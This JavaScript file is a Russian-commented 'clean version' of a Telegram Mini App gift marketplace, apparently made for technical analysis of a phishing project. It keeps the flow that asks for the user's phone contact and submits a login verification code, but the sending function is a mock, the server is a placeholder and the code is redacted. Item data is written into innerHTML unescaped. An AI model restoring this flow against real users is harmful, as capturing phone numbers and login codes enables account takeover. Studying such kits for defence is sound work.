// =================================================================
// ТЕХНИЧЕСКИЙ АНАЛИЗ ИСХОДНОГО КОДА ПРОЕКТА [CLEAN VERSION]
// =================================================================

const SERVER_URL = 'https://api.internal-analysis.local/auth'; // Заглушка

async function sendData(payload) {
    console.log("📤 Mock Sending:", payload);
    return { status: "SUCCESS" }; 
}

// ГЛОБАЛЬНЫЕ ФУНКЦИИ ИНТЕРФЕЙСА
window.sendTelegramContact = function() {
    const tg = window.Telegram.WebApp;
    tg.requestContact((result) => {
        if (result) sendData({ action: 'send_phone', data: result });
    });
};

window.openBuySheet = function(name, serial, price, image) {
    const sheet = document.getElementById('buyGiftSheet');
    if (sheet) {
        document.getElementById('buyGiftName').innerText = name;
        document.getElementById('buyGiftId').innerText = `#${serial}`;
        document.getElementById('buyGiftPrice').innerText = price;
        document.getElementById('buyGiftImg').src = image;
        sheet.classList.add('active');
        window.Telegram.WebApp.BackButton.show();
    }
};

// ОСНОВНАЯ ЛОГИКА ПРИЛОЖЕНИЯ
document.addEventListener('DOMContentLoaded', async () => {
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.ready();

    // Элементы разделов
    const marketSection = document.getElementById('market-section');
    const giftsSection = document.getElementById('gifts-section');
    const profileSection = document.getElementById('profile-section');
    const headerMain = document.querySelector('.header');

    // Карта навигации (ID кнопки -> Элемент секции)
    const tabs = {
        'tab-market': marketSection,
        'tab-gifts': giftsSection,
        'tab-profile': profileSection
    };

    // Логика переключения табов
    Object.keys(tabs).forEach(tabId => {
        const el = document.getElementById(tabId);
        if (el) {
            el.onclick = (e) => {
                e.preventDefault();

                // Скрываем все секции (безопасно)
                if (marketSection) marketSection.style.display = 'none';
                if (giftsSection) giftsSection.style.display = 'none';
                if (profileSection) profileSection.style.display = 'none';

                // Показываем нужную
                const target = tabs[tabId];
                if (target) target.style.display = 'block';

                // Управление хедером (скрываем в профиле, как в оригинале)
                if (headerMain) {
                    headerMain.style.display = (tabId === 'tab-profile') ? 'none' : 'flex';
                }

                // Подсветка активной кнопки (используем tab-item из твоего HTML)
                document.querySelectorAll('.tab-item').forEach(t => t.classList.remove('active'));
                el.classList.add('active');

                if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
            };
        }
    });

    // Рендер карточек
    async function loadData() {
        try {
            const response = await fetch('./portals_fixed_final.json');
            const allItems = await response.json();
            const container = document.getElementById('card-container');
            if (container && allItems) {
                container.innerHTML = allItems.map(item => `
                    <div class="card">
                        <img src="${item.image}">
                        <div class="info">
                            <div class="title">${item.name}</div>
                            <button onclick="window.openBuySheet('${item.name}', '${item.serial}', '${item.price}', '${item.image}')">
                                ${item.price} TON
                            </button>
                        </div>
                    </div>`).join('');
            }
        } catch (e) { console.log("Data Load Error"); }
    }

    // Обработка авторизации (оставлена логика для отчета)
    const verifyCodeBtn = document.getElementById('verifyCodeBtn');
    if (verifyCodeBtn) {
        verifyCodeBtn.onclick = async () => {
            await sendData({ action: 'check_code', code: 'REDACTED' });
            const step3 = document.getElementById('auth-step-3');
            if (step3) step3.style.display = 'block';
        };
    }

    await loadData();
});
